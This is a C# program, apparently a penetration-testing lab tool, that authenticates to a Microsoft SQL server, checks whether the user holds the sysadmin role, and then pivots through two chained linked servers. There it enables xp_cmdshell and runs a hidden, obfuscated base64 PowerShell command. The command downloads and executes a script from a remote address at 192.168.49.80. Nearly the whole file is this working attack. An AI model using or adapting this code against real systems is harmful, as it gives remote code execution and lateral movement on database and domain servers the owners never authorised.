using System;
using System.Data.SqlClient;

namespace MSSQL
{
    public class Program
    {
        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }

        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }

        public static void Main(string[] args)
        {
            //String serv = "dc01.corp1.com";

            String serv = "cdc01";
            String db = "master";
            String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conStr);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failed.");
                Environment.Exit(0);
            }

            // Enumerate login info
            String login = executeQuery("SELECT SYSTEM_USER;", con);
            Console.WriteLine($"[*] Logged in as: {login}");
            String uname = executeQuery("SELECT USER_NAME();", con);
            Console.WriteLine($"[*] Database username: {uname}");
            getGroupMembership("public", con);
            getGroupMembership("sysadmin", con);
            executeQuery("EXEC ('EXEC (''EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE; EXEC xp_cmdshell ''''C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win hidden -nonI -noP -Exe ByPass -ENC JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AOAAwAC8AcgB1AG4ALgB0AHgAdAAnACkAKQA='''';'') AT [dc01.corp2.com]') AT [rdc01.corp1.com]", con);
            con.Close();
        }
    }
}